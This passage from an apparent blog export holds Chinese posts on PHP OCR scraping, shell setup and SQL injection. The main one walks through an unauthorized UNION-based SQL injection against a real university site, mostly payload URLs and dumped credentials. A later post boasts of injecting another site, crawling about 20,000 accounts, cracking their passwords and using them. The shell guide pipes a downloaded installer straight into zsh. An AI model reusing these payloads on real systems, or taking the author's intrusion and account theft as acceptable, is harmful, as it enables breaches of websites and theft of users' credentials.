TessBaseAPI;\n$api-&gt;Init(&quot;.&quot;,&quot;eng&quot;,$mode_or_oem=OEM_DEFAULT);\n$api-&gt;SetPageSegMode(PSM_AUTO);\n\n$mImgFile = &quot;eurotext.jpg&quot;;\n$handle=fopen($mImgFile,&quot;rb&quot;);\n$mBuffer=fread($handle,filesize($mImgFile));\nprint strlen($mBuffer);\n$result=ProcessPagesBuffer($mBuffer,strlen($mBuffer),$api);\nprint &quot;result(ProcessPagesBuffer)=&quot;;\nprint $result;\n$result = ProcessPagesFileStream($mImgFile,$api);\nprint &quot;result(ProcessPagesFileStream)=&quot;;\nprint $result;\n</code></pre>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"13","plaintext":"在做一些网络爬虫工具的时候，经常需要把图片信息转化成文本数据（比如电商网站相互之间比价，而价格往往是图片格式）。网上关于PHP图像识别的文章不少，不过质量都不怎么样，好的工具包更是寥寥无几。好不容易找到一个优秀的PHP图片识别扩展，和大家分享一下。\n\n首先安装依赖程序:\n\nsudo apt-get install python-distutils-extra tesseract-ocr tesseract-ocr-eng libtesseract-dev libleptonica-dev php5-dev swig libcv-dev build-essential subversion\n\n\n编译安装 php-tesseract:\n\nsvn checkout http://php-tesseract.googlecode.com/svn/trunk/ php-tesseract\ncd php-tesseract\n./configure --prefix=/usr\nmake\nsudo make install\nmake test\n\n\n这里有一个官方提供的例子：\n\nwget http://php-tesseract.googlecode.com/files/tesseract.php\nwget http://php-tesseract.googlecode.com/files/eurotext.jpg\nwget http://php-tesseract.googlecode.com/files/test.php\nphp test.php\n\n\n开发时，只要把tesseract.php包含到你的代码中就可以使用了。\n\n * 官方提示：需要把 php.ini 中 enable_dl 设为 On\n\nExample:\n\ninclude 'tesseract.php';\n$api= new TessBaseAPI;\n$api->Init(\".\",\"eng\",$mode_or_oem=OEM_DEFAULT);\n$api->SetPageSegMode(PSM_AUTO);\n\n$mImgFile = \"eurotext.jpg\";\n$handle=fopen($mImgFile,\"rb\");\n$mBuffer=fread($handle,filesize($mImgFile));\nprint strlen($mBuffer);\n$result=ProcessPagesBuffer($mBuffer,strlen($mBuffer),$api);\nprint \"result(ProcessPagesBuffer)=\";\nprint $result;\n$result = ProcessPagesFileStream($mImgFile,$api);\nprint \"result(ProcessPagesFileStream)=\";\nprint $result;","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2013-12-19 04:35:05","updated_at":"2015-04-04 02:16:01","published_at":"2013-08-10 04:00:00","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e61","uuid":"b90c4a59-19a8-4905-a9fb-c9db87dde13d","title":"记一次标准化SQL注入","slug":"standard-sql-injection","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"以下是对某网站一次教科书式的SQL注入攻击,因为该类漏洞大量存在于比较陈旧的网站中，具有很强的可复制性,写下来仅供参考.\\n   \\n **注入点**\\n \\n同一个服务器上可能部署了多个网站,甚至是已经废弃但是还没有被关闭的旧版网站,新开发的网站一般都会使用一些开发框架或者是基于开源系统的二次开发,存在严重漏洞的机会相对较小,而攻击就可以从那些老旧的网站入手.\\n <pre><code>http://www.xxxxx.edu.cn/xxxx/team_intro.php?id=41'</code></pre>\\n \\n 这是老版网站中的一个注入点,加 ' 注入,直接爆出表名.\\n \\n<pre>\\n 有效信息:\\n     表名 ： ee_team_intro\\n</pre>\\n\\n**获取字段数**\\n\\n因为使用UNION SELECT查询时,要求被拼接的两张表的字段数必须相等,所以需要首先知道当前表的字段数量,以及字段与页面数据的对应关系.\\n\\nurl_decode %23 = # ,作用是注释掉之后的SQL语句. \\n<pre>\\n<code>http://www.xxxxx.edu.cn/2011/xxxxx/team_intro.php?id=41'%20or%201='1'%20UNION%20Select%201,2,3,4,5,6,7,8,9,10,11,12,13%20FROM%20ee_team_intro%23</code></pre>\\n <pre>\\n 有效信息:\\n     ee_team_intro 13个字段，以及对应在页面中的位置.\\n</pre>\\n \\n **获取其他表名**\\n \\n informationschema 保存了当前Mysql中所有数据库的结构信息,充分利用可以获取大量有效的信息.以下语句可以获得以ee开头的全部数据表(当前数据库中的表都以ee开头).\\n \\n url_decode %25 = % ,作用是在SQL语句中使用LIKE. \\n \\n <pre> <code>http://www.xxxxx.edu.cn/2011/xxxxx/team_intro.php?id=41'%20and%201='0'%20UNION%20Select%201,TABLE_NAME,3,4,5,6,7,8,9,10,11,12,13%20FROM%20information_schema.TABLES%20WHERE%20TABLE_NAME%20LIKE%20%22%25ee_%25%22%%23</code></pre>\\n \\n<pre>\\n 有效信息:\\n     有价值的表名 ee_admin，ee_user\\n</pre>\\n \\n **获取字段**\\n \\n <pre><code>http://www.xxxxx.edu.cn/xxxxx/team_intro.php?id=41'%20and%201='0'%20UNION%20Select%201,COLUMN_NAME,3,4,5,6,7,8,9,10,11,12,13%20FROM%20information_schema.`COLUMNS`%20WHERE%20TABLE_NAME='ee_admin'%20LIMIT%201,1%23</code></pre>\\n \\n<pre>\\n 有效信息:\\n     有价值的字段 \\n     ee_admin : id,name,password,class\\n     ee_user : id,name,pwd , ...\\n</pre>\\n \\n **爆数据**\\n \\n user表\\n <pre><code>http://www.xxxxx.edu.cn/xxxxx/team_intro.php?id=41'%20and%201=0%20UNION%20SELECT%201,pwd,name,4,5,6,7,8,9,10,11,12,13%20FROM%20`ee_user`%20WHERE%201%20%23</code></pre>\\n<pre>\\n 有效信息:\\n\\tuser表数据: \\n      ad** : l***9\\n\\t  徐** : 1***6\\n\\t  钱** : y***g\\n</pre>\\n\\nadmin表\\n<pre>\\n用同样方法尝试爆出ee_admin数据时，却发现无法查出admin的name和password信息，却可以查出id等数字字段，经分析认为是字段采用的字符集不同导致 UNION SELECT 出错，经验证：\\nee_team_intro,ee_user 字符集编码为 latin1_swedish_ci\\nee_admin 字符集编码为 gbk_chinese_ci\\n</pre>\\n\\n用HEX函数转为16进制的方式解决该问题。\\n<pre><code>http://www.xxxxx.edu.cn/xxxxx/team_intro.php?id=41'%20and%201=0%20UNION%20SELECT%201,UNHEX(HEX(password)),UNHEX(HEX(name)),4,5,6,7,8,9,10,11,12,13%20FROM%20`ee_admin`%20WHERE%201%20%23</code></pre>\\n<pre>\\n 有效信息:\\n\\tadmin表数据: \\n       b** ： ***\\n       l** ： ***\\n</pre>\\n \\n**跨数据库攻击**\\n\\n老网站数据库中的信息价值也许并不大,不过我们可以从老网站的sql漏洞爆出新版网站数据.新网站上不太严重的SQL漏洞为我们提供了数据表的命名方式及数据库名称,不过就算没有也没关系,我们照样可以通过穷举informationschema.Table中的数据去得到我们需要的信息.\\n\\n还是相同的方式:\\n<pre><code>http://www.xxxxx.edu.cn/2011/xxxxx/team_intro.php?id=41'%20and%201=0%20UNION%20ALL%20SELECT%201,UNHEX(HEX(`password`)),UNHEX(HEX(`username`)),4,5,6,7,8,9,10,11,12,13%20FROM%20dircms_gbk_sp1.`dircms_member`%20WHERE%201%20LIMIT%200,1%23</code></pre>\\n\\n<pre>\\n 有效信息:\\n\\tdircms_member表数据: \\n      d**s : ***\\n      a**s : ***\\n      电**院 : ***\\n</pre>\\n \\n **结语**\\n \\n <pre>\\n   至此,我们基本上已经拿到了我们需要的一切.通过这次注入,我们也能得到一些启示:\\n</pre>\\n* 开发时尽可能使用成熟的开发框架,而不是完全DIY以减少因个人疏忽而造成的不必要的漏洞.\\n* 废弃的网站一定要及时关闭,不然很可能对同一台服务器上其他的网站系统造成威胁.\\n* 开源系统的质量参差不齐,即使二次开发也不要过于依赖开源系统的可靠性,当然,除非你并不太关心系统的安全性问题~\\n* 从用户的角度,尽可能不要把重要的信息放在看起来就很不靠谱的网站上,否则将可能会带来危险.\\n\\n![sql injection](/content/images/2013/Dec/______5_mh1387553489151-1.jpg)\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>以下是对某网站一次教科书式的SQL注入攻击,因为该类漏洞大量存在于比较陈旧的网站中，具有很强的可复制性,写下来仅供参考.</p>\n<p><strong>注入点</strong></p>\n<p>同一个服务器上可能部署了多个网站,甚至是已经废弃但是还没有被关闭的旧版网站,新开发的网站一般都会使用一些开发框架或者是基于开源系统的二次开发,存在严重漏洞的机会相对较小,而攻击就可以从那些老旧的网站入手.</p>\n <pre><code>http://www.xxxxx.edu.cn/xxxx/team_intro.php?id=41'</code></pre>\n<p>这是老版网站中的一个注入点,加 ' 注入,直接爆出表名.</p>\n<pre>\n 有效信息:\n     表名 ： ee_team_intro\n</pre>\n<p><strong>获取字段数</strong></p>\n<p>因为使用UNION SELECT查询时,要求被拼接的两张表的字段数必须相等,所以需要首先知道当前表的字段数量,以及字段与页面数据的对应关系.</p>\n<p>url_decode %23 = # ,作用是注释掉之后的SQL语句.</p>\n<pre>\n<code>http://www.xxxxx.edu.cn/2011/xxxxx/team_intro.php?id=41'%20or%201='1'%20UNION%20Select%201,2,3,4,5,6,7,8,9,10,11,12,13%20FROM%20ee_team_intro%23</code></pre>\n <pre>\n 有效信息:\n     ee_team_intro 13个字段，以及对应在页面中的位置.\n</pre>\n<p><strong>获取其他表名</strong></p>\n<p>informationschema 保存了当前Mysql中所有数据库的结构信息,充分利用可以获取大量有效的信息.以下语句可以获得以ee开头的全部数据表(当前数据库中的表都以ee开头).</p>\n<p>url_decode %25 = % ,作用是在SQL语句中使用LIKE.</p>\n <pre> <code>http://www.xxxxx.edu.cn/2011/xxxxx/team_intro.php?id=41'%20and%201='0'%20UNION%20Select%201,TABLE_NAME,3,4,5,6,7,8,9,10,11,12,13%20FROM%20information_schema.TABLES%20WHERE%20TABLE_NAME%20LIKE%20%22%25ee_%25%22%%23</code></pre>\n<pre>\n 有效信息:\n     有价值的表名 ee_admin，ee_user\n</pre>\n<p><strong>获取字段</strong></p>\n <pre><code>http://www.xxxxx.edu.cn/xxxxx/team_intro.php?id=41'%20and%201='0'%20UNION%20Select%201,COLUMN_NAME,3,4,5,6,7,8,9,10,11,12,13%20FROM%20information_schema.`COLUMNS`%20WHERE%20TABLE_NAME='ee_admin'%20LIMIT%201,1%23</code></pre>\n<pre>\n 有效信息:\n     有价值的字段 \n     ee_admin : id,name,password,class\n     ee_user : id,name,pwd , ...\n</pre>\n<p><strong>爆数据</strong></p>\n<p>user表</p>\n <pre><code>http://www.xxxxx.edu.cn/xxxxx/team_intro.php?id=41'%20and%201=0%20UNION%20SELECT%201,pwd,name,4,5,6,7,8,9,10,11,12,13%20FROM%20`ee_user`%20WHERE%201%20%23</code></pre>\n<pre>\n 有效信息:\n\tuser表数据: \n      ad** : l***9\n\t  徐** : 1***6\n\t  钱** : y***g\n</pre>\n<p>admin表</p>\n<pre>\n用同样方法尝试爆出ee_admin数据时，却发现无法查出admin的name和password信息，却可以查出id等数字字段，经分析认为是字段采用的字符集不同导致 UNION SELECT 出错，经验证：\nee_team_intro,ee_user 字符集编码为 latin1_swedish_ci\nee_admin 字符集编码为 gbk_chinese_ci\n</pre>\n<p>用HEX函数转为16进制的方式解决该问题。</p>\n<pre><code>http://www.xxxxx.edu.cn/xxxxx/team_intro.php?id=41'%20and%201=0%20UNION%20SELECT%201,UNHEX(HEX(password)),UNHEX(HEX(name)),4,5,6,7,8,9,10,11,12,13%20FROM%20`ee_admin`%20WHERE%201%20%23</code></pre>\n<pre>\n 有效信息:\n\tadmin表数据: \n       b** ： ***\n       l** ： ***\n</pre>\n<p><strong>跨数据库攻击</strong></p>\n<p>老网站数据库中的信息价值也许并不大,不过我们可以从老网站的sql漏洞爆出新版网站数据.新网站上不太严重的SQL漏洞为我们提供了数据表的命名方式及数据库名称,不过就算没有也没关系,我们照样可以通过穷举informationschema.Table中的数据去得到我们需要的信息.</p>\n<p>还是相同的方式:</p>\n<pre><code>http://www.xxxxx.edu.cn/2011/xxxxx/team_intro.php?id=41'%20and%201=0%20UNION%20ALL%20SELECT%201,UNHEX(HEX(`password`)),UNHEX(HEX(`username`)),4,5,6,7,8,9,10,11,12,13%20FROM%20dircms_gbk_sp1.`dircms_member`%20WHERE%201%20LIMIT%200,1%23</code></pre>\n<pre>\n 有效信息:\n\tdircms_member表数据: \n      d**s : ***\n      a**s : ***\n      电**院 : ***\n</pre>\n<p><strong>结语</strong></p>\n <pre>\n   至此,我们基本上已经拿到了我们需要的一切.通过这次注入,我们也能得到一些启示:\n</pre>\n<ul>\n<li>开发时尽可能使用成熟的开发框架,而不是完全DIY以减少因个人疏忽而造成的不必要的漏洞.</li>\n<li>废弃的网站一定要及时关闭,不然很可能对同一台服务器上其他的网站系统造成威胁.</li>\n<li>开源系统的质量参差不齐,即使二次开发也不要过于依赖开源系统的可靠性,当然,除非你并不太关心系统的安全性问题~</li>\n<li>从用户的角度,尽可能不要把重要的信息放在看起来就很不靠谱的网站上,否则将可能会带来危险.</li>\n</ul>\n<p><img src=\"/content/images/2013/Dec/______5_mh1387553489151-1.jpg\" alt=\"sql injection\"></p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"14","plaintext":"以下是对某网站一次教科书式的SQL注入攻击,因为该类漏洞大量存在于比较陈旧的网站中，具有很强的可复制性,写下来仅供参考.\n\n注入点\n\n同一个服务器上可能部署了多个网站,甚至是已经废弃但是还没有被关闭的旧版网站,新开发的网站一般都会使用一些开发框架或者是基于开源系统的二次开发,存在严重漏洞的机会相对较小,而攻击就可以从那些老旧的网站入手.\n\nhttp://www.xxxxx.edu.cn/xxxx/team_intro.php?id=41'\n\n这是老版网站中的一个注入点,加 ' 注入,直接爆出表名.\n\n\n 有效信息:\n     表名 ： ee_team_intro\n\n\n获取字段数\n\n因为使用UNION SELECT查询时,要求被拼接的两张表的字段数必须相等,所以需要首先知道当前表的字段数量,以及字段与页面数据的对应关系.\n\nurl_decode %23 = # ,作用是注释掉之后的SQL语句.\n\n\nhttp://www.xxxxx.edu.cn/2011/xxxxx/team_intro.php?id=41'%20or%201='1'%20UNION%20Select%201,2,3,4,5,6,7,8,9,10,11,12,13%20FROM%20ee_team_intro%23\n\n\n 有效信息:\n     ee_team_intro 13个字段，以及对应在页面中的位置.\n\n\n获取其他表名\n\ninformationschema\n保存了当前Mysql中所有数据库的结构信息,充分利用可以获取大量有效的信息.以下语句可以获得以ee开头的全部数据表(当前数据库中的表都以ee开头).\n\nurl_decode %25 = % ,作用是在SQL语句中使用LIKE.\n\n http://www.xxxxx.edu.cn/2011/xxxxx/team_intro.php?id=41'%20and%201='0'%20UNION%20Select%201,TABLE_NAME,3,4,5,6,7,8,9,10,11,12,13%20FROM%20information_schema.TABLES%20WHERE%20TABLE_NAME%20LIKE%20%22%25ee_%25%22%%23\n\n\n 有效信息:\n     有价值的表名 ee_admin，ee_user\n\n\n获取字段\n\nhttp://www.xxxxx.edu.cn/xxxxx/team_intro.php?id=41'%20and%201='0'%20UNION%20Select%201,COLUMN_NAME,3,4,5,6,7,8,9,10,11,12,13%20FROM%20information_schema.`COLUMNS`%20WHERE%20TABLE_NAME='ee_admin'%20LIMIT%201,1%23\n\n\n 有效信息:\n     有价值的字段 \n     ee_admin : id,name,password,class\n     ee_user : id,name,pwd , ...\n\n\n爆数据\n\nuser表\n\nhttp://www.xxxxx.edu.cn/xxxxx/team_intro.php?id=41'%20and%201=0%20UNION%20SELECT%201,pwd,name,4,5,6,7,8,9,10,11,12,13%20FROM%20`ee_user`%20WHERE%201%20%23\n\n\n 有效信息:\n\tuser表数据: \n      ad** : l***9\n\t  徐** : 1***6\n\t  钱** : y***g\n\n\nadmin表\n\n\n用同样方法尝试爆出ee_admin数据时，却发现无法查出admin的name和password信息，却可以查出id等数字字段，经分析认为是字段采用的字符集不同导致 UNION SELECT 出错，经验证：\nee_team_intro,ee_user 字符集编码为 latin1_swedish_ci\nee_admin 字符集编码为 gbk_chinese_ci\n\n\n用HEX函数转为16进制的方式解决该问题。\n\nhttp://www.xxxxx.edu.cn/xxxxx/team_intro.php?id=41'%20and%201=0%20UNION%20SELECT%201,UNHEX(HEX(password)),UNHEX(HEX(name)),4,5,6,7,8,9,10,11,12,13%20FROM%20`ee_admin`%20WHERE%201%20%23\n\n\n 有效信息:\n\tadmin表数据: \n       b** ： ***\n       l** ： ***\n\n\n跨数据库攻击\n\n老网站数据库中的信息价值也许并不大,不过我们可以从老网站的sql漏洞爆出新版网站数据.新网站上不太严重的SQL漏洞为我们提供了数据表的命名方式及数据库名称,不过就算没有也没关系,我们照样可以通过穷举informationschema.Table中的数据去得到我们需要的信息.\n\n还是相同的方式:\n\nhttp://www.xxxxx.edu.cn/2011/xxxxx/team_intro.php?id=41'%20and%201=0%20UNION%20ALL%20SELECT%201,UNHEX(HEX(`password`)),UNHEX(HEX(`username`)),4,5,6,7,8,9,10,11,12,13%20FROM%20dircms_gbk_sp1.`dircms_member`%20WHERE%201%20LIMIT%200,1%23\n\n\n 有效信息:\n\tdircms_member表数据: \n      d**s : ***\n      a**s : ***\n      电**院 : ***\n\n\n结语\n\n\n   至此,我们基本上已经拿到了我们需要的一切.通过这次注入,我们也能得到一些启示:\n\n\n * 开发时尽可能使用成熟的开发框架,而不是完全DIY以减少因个人疏忽而造成的不必要的漏洞.\n * 废弃的网站一定要及时关闭,不然很可能对同一台服务器上其他的网站系统造成威胁.\n * 开源系统的质量参差不齐,即使二次开发也不要过于依赖开源系统的可靠性,当然,除非你并不太关心系统的安全性问题~\n * 从用户的角度,尽可能不要把重要的信息放在看起来就很不靠谱的网站上,否则将可能会带来危险.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2013-12-20 15:31:39","updated_at":"2016-02-12 07:27:34","published_at":"2013-12-20 15:31:39","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e62","uuid":"5b40841a-d4bf-460d-813e-8d7dcce073b0","title":"博客迁移到阿里云","slug":"bo-ke-qian-yi-dao-a-li-yun","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"毕业以后不可以再借用之前的学校的服务器了,好伤心啊...\\n\\n目前已迁移到阿里云,目测还不错!\\n\\n![Aliyun](/content/images/2013/Dec/aliyun_PNG.png)\\n\\n虽然是最低配置,跑个博客还是绰绰有余了 O(∩_∩)O~\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>毕业以后不可以再借用之前的学校的服务器了,好伤心啊...</p>\n<p>目前已迁移到阿里云,目测还不错!</p>\n<p><img src=\"/content/images/2013/Dec/aliyun_PNG.png\" alt=\"Aliyun\"></p>\n<p>虽然是最低配置,跑个博客还是绰绰有余了 O(∩_∩)O~</p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"15","plaintext":"毕业以后不可以再借用之前的学校的服务器了,好伤心啊...\n\n目前已迁移到阿里云,目测还不错!\n\n\n\n虽然是最低配置,跑个博客还是绰绰有余了 O(∩_∩)O~","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2013-12-22 08:11:38","updated_at":"2016-02-11 05:46:53","published_at":"2013-12-22 08:11:38","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e63","uuid":"ea5f52b2-6131-493c-b767-32db8cc19a63","title":"Linux终端实践: zsh+tmux+vim","slug":"linuxzhong-duan-shi-jian-zsh-tmux-vim","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"zsh : 一个非常棒的shell,丰富样式主题,强大的插件支持,可以实现各种厉害的功能.完全有理由替代bash.\\nTmux : 如果你用过Screen的话,那么可以考虑用Tmux代替Screen了.\\nVim : 彪悍的编辑器不需要解释.\\n\\n**我的配置 :**       \\n<pre>\\n<code>$ git clone git@github.com:chxj1992/myConfig.git</code>\\n<code>$ cd myConfig/</code>\\n</pre>\\n\\n**ZSH ?**\\n<pre>\\n<code>$ sudo apt-get install zsh</code>\\n</pre>\\n* 安装 oh-my-zsh\\n<pre>\\n<code>$ wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | zsh</code>\\n<code>$ chsh -s which zsh</code>\\n<code>$ cp -f .zshrc .zsh_aliases ~/</code>\\n</pre>\\n* 重新登录后生效\\n\\n**Tmux ?**\\n<pre>\\n<code>$ sudo apt-get install tmux</code>\\n<code>$ cp -f .tmux.conf ~/</code>\\n</pre>\\n\\n**Vim ?**\\n<pre>\\n<code>$ sudo apt-get install vim</code>\\n<code>$ cp -fr .vimrc .fonts ~/</code>\\n<code>$ git clone https://github.com/vim-scripts/northland.vim.git ~/.vim/ </code>\\n<code>$ git clone https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle</code>\\n</pre>\\n\\n* 用Bundle安装vim插件\\n<pre>\\n<code>$ :BundleInstall</code>\\n</pre>\\n\\n![zsh](/content/images/2014/Jan/Screenshot_from_2013_12_23_21_42_04.png)\\n\\n必须推荐一个zsh插件, ***z*** ! 用它你可以快速跳转到你访问过打任何目录,高效终端必备神器啊 !\\n![z](/content/images/2013/Dec/z-1.png)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>zsh : 一个非常棒的shell,丰富样式主题,强大的插件支持,可以实现各种厉害的功能.完全有理由替代bash.<br>\nTmux : 如果你用过Screen的话,那么可以考虑用Tmux代替Screen了.<br>\nVim : 彪悍的编辑器不需要解释.</p>\n<p><strong>我的配置 :</strong></p>\n<pre>\n<code>$ git clone git@github.com:chxj1992/myConfig.git</code>\n<code>$ cd myConfig/</code>\n</pre>\n<p><strong>ZSH ?</strong></p>\n<pre>\n<code>$ sudo apt-get install zsh</code>\n</pre>\n<ul>\n<li>安装 oh-my-zsh</li>\n</ul>\n<pre>\n<code>$ wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | zsh</code>\n<code>$ chsh -s which zsh</code>\n<code>$ cp -f .zshrc .zsh_aliases ~/</code>\n</pre>\n<ul>\n<li>重新登录后生效</li>\n</ul>\n<p><strong>Tmux ?</strong></p>\n<pre>\n<code>$ sudo apt-get install tmux</code>\n<code>$ cp -f .tmux.conf ~/</code>\n</pre>\n<p><strong>Vim ?</strong></p>\n<pre>\n<code>$ sudo apt-get install vim</code>\n<code>$ cp -fr .vimrc .fonts ~/</code>\n<code>$ git clone https://github.com/vim-scripts/northland.vim.git ~/.vim/ </code>\n<code>$ git clone https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle</code>\n</pre>\n<ul>\n<li>用Bundle安装vim插件</li>\n</ul>\n<pre>\n<code>$ :BundleInstall</code>\n</pre>\n<p><img src=\"/content/images/2014/Jan/Screenshot_from_2013_12_23_21_42_04.png\" alt=\"zsh\"></p>\n<p>必须推荐一个zsh插件, <em><strong>z</strong></em> ! 用它你可以快速跳转到你访问过打任何目录,高效终端必备神器啊 !<br>\n<img src=\"/content/images/2013/Dec/z-1.png\" alt=\"z\"></p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"17","plaintext":"zsh : 一个非常棒的shell,丰富样式主题,强大的插件支持,可以实现各种厉害的功能.完全有理由替代bash.\nTmux : 如果你用过Screen的话,那么可以考虑用Tmux代替Screen了.\nVim : 彪悍的编辑器不需要解释.\n\n我的配置 :\n\n\n$ git clone git@github.com:chxj1992/myConfig.git\n$ cd myConfig/\n\n\nZSH ?\n\n\n$ sudo apt-get install zsh\n\n\n * 安装 oh-my-zsh\n\n\n$ wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | zsh\n$ chsh -s which zsh\n$ cp -f .zshrc .zsh_aliases ~/\n\n\n * 重新登录后生效\n\nTmux ?\n\n\n$ sudo apt-get install tmux\n$ cp -f .tmux.conf ~/\n\n\nVim ?\n\n\n$ sudo apt-get install vim\n$ cp -fr .vimrc .fonts ~/\n$ git clone https://github.com/vim-scripts/northland.vim.git ~/.vim/ \n$ git clone https://github.com/gmarik/vundle.git ~/.vim/bundle/vundle\n\n\n * 用Bundle安装vim插件\n\n\n$ :BundleInstall\n\n\n\n\n必须推荐一个zsh插件, z  ! 用它你可以快速跳转到你访问过打任何目录,高效终端必备神器啊 !","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2013-12-23 13:43:46","updated_at":"2016-02-11 05:45:50","published_at":"2013-12-23 13:43:46","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e65","uuid":"f14072f6-7cd5-44f2-8091-30701e4fe2e5","title":"降低SQL注入带来的危害","slug":"jiuye-sql-injection","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\n参考 [记一次标准化SQL注入](http://http://blog.chxj.name/standard-sql-injection/) 的流程,再次注入了 [某网站](http://jiuye.org), 同时也证明程序的漏洞确实无处不在,所以作为用户千万别把什么都搁网上.作为开发者必须对自己的代码更加负责,尽可能减少被攻击的可能性以及受到攻击后将可能的危害设在一个可控的范围内,否则,很可能造成非常严重的损失.\\n\\n大部分程序员对自己写的代码非常有信心,认为自己编写的代码是非常严谨的而对其他方面的安全性问题放松了警惕,这往往是最危险的做法.其实,如果稍微做一点工作,即使出现漏洞,大部分攻击也很难对程序(或网站)造成实质性的破坏,以下是目前想到的一些简单的防范措施,经供参考:\\n\\n* 对不同的项目配置独立的数据库权限,避免因为某一个网站的漏洞而造成大面积的跨库攻击.同时,也不要给项目数据库用户提供mysql, infomation_schema 等系统级数据库的权限,避免攻击者很容易就得到数据库的结构信息.\\n\\n* 数据表的命名不要过于常规,如 user 等,实在是太容易被猜到了.\\n\\n* 关闭各种报错信息,可以有效提高攻击的难度,如果不是有目的的攻击者,遇到只能盲注的一般也就放弃了.\\n\\n* 到现在还有大量的开发者认为MD5是安全的加密方式, google一下,做各种 [Hash型密码破解](http://www.md5.com.cn/) 的网站真的是越来越牛逼,8位以下的数字密码不用付费都给你了, 作为被攻击并被爆表后,网站的最后一道防线,请重视一点,至少不要使用太常规的加密方式,不然真的没办法了.\\n\\n* 开发完成后,最好用APPScan之类的检测工具自己扫描一下,应该能发现不少问题.\\n\\n* 最后一点,千万不要觉得二次开发的产品就很安全,写开源软件的不都是大神,开源软件也很可能是我这样的代码猴子写出来的,所以,请还是亲力亲为地自己检查一下.\\n\\n* 如果以上各点枪枪全中(其实不用全中,有个2,3个就足够了),那基本上是死定了,即使是现在没有BUG,也难保在各种压力下迭代的过程不会出现BUG. 下场嘛,就和 CSDN ,或者 2000w 什么的差不多.\\n\\n对于这种完全无视安全的网站,再恰逢解码网站测试,全部数据统统免费,只好写一个[小爬虫](https://github.com/chenxiaojing123/JiuyeCrawl),把用户数据全部爬出来再解个密.想到以前为了帮别人搞一个学校就业账号到处问人,现在不光有了2w个账号我还能发就业信息,还是值了.\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p>参考 <a href=\"http://http://blog.chxj.name/standard-sql-injection/\">记一次标准化SQL注入</a> 的流程,再次注入了 <a href=\"http://jiuye.org\">某网站</a>, 同时也证明程序的漏洞确实无处不在,所以作为用户千万别把什么都搁网上.作为开发者必须对自己的代码更加负责,尽可能减少被攻击的可能性以及受到攻击后将可能的危害设在一个可控的范围内,否则,很可能造成非常严重的损失.</p>\n<p>大部分程序员对自己写的代码非常有信心,认为自己编写的代码是非常严谨的而对其他方面的安全性问题放松了警惕,这往往是最危险的做法.其实,如果稍微做一点工作,即使出现漏洞,大部分攻击也很难对程序(或网站)造成实质性的破坏,以下是目前想到的一些简单的防范措施,经供参考:</p>\n<ul>\n<li>\n<p>对不同的项目配置独立的数据库权限,避免因为某一个网站的漏洞而造成大面积的跨库攻击.同时,也不要给项目数据库用户提供mysql, infomation_schema 等系统级数据库的权限,避免攻击者很容易就得到数据库的结构信息.</p>\n</li>\n<li>\n<p>数据表的命名不要过于常规,如 user 等,实在是太容易被猜到了.</p>\n</li>\n<li>\n<p>关闭各种报错信息,可以有效提高攻击的难度,如果不是有目的的攻击者,遇到只能盲注的一般也就放弃了.</p>\n</li>\n<li>\n<p>到现在还有大量的开发者认为MD5是安全的加密方式, google一下,做各种 <a href=\"http://www.md5.com.cn/\">Hash型密码破解</a> 的网站真的是越来越牛逼,8位以下的数字密码不用付费都给你了, 